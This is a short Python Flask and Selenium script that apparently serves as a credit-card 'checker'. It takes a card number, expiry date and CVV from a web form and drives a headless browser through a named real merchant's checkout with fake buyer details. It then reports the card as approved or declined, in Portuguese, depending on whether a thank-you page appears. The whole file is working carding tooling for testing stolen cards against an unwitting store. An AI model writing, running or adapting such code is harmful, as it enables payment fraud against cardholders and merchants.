from flask import Flask, render_template, request
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
import time

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def index():
    result = None
    if request.method == "POST":
        cc = request.form["cc"]
        mes = request.form["mes"]
        ano = request.form["ano"]
        cvv = request.form["cvv"]

        chrome_options = Options()
        chrome_options.add_argument("--headless")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")

        driver = webdriver.Chrome(options=chrome_options)
        driver.get("https://www.danceoutfitters.com/storefront.html")
        
        try:
            driver.find_element(By.NAME, "Email Address").send_keys("teste@email.com")
            driver.find_element(By.NAME, "First Name").send_keys("Test")
            driver.find_element(By.NAME, "Last Name").send_keys("User")
            driver.find_element(By.NAME, "Address").send_keys("123 Test Ave")
            driver.find_element(By.NAME, "City").send_keys("New York")
            driver.find_element(By.NAME, "State").send_keys("NY")
            driver.find_element(By.NAME, "Zip").send_keys("10001")
            driver.find_element(By.NAME, "Phone").send_keys("1234567890")
            driver.find_element(By.NAME, "Credit Card Number").send_keys(cc)
            driver.find_element(By.NAME, "ExpMonth").send_keys(mes)
            driver.find_element(By.NAME, "ExpYear").send_keys(ano)
            driver.find_element(By.NAME, "CVV").send_keys(cvv)

            time.sleep(2)
            driver.find_element(By.NAME, "Submit").click()
            time.sleep(5)

            if "Thank You" in driver.page_source:
                result = "✅ Cartão Aprovado!"
            else:
                result = "❌ Cartão Recusado!"
        except Exception as e:
            result = "⚠️ Erro ao processar: " + str(e)
        finally:
            driver.quit()

    return render_template("index.html", result=result)
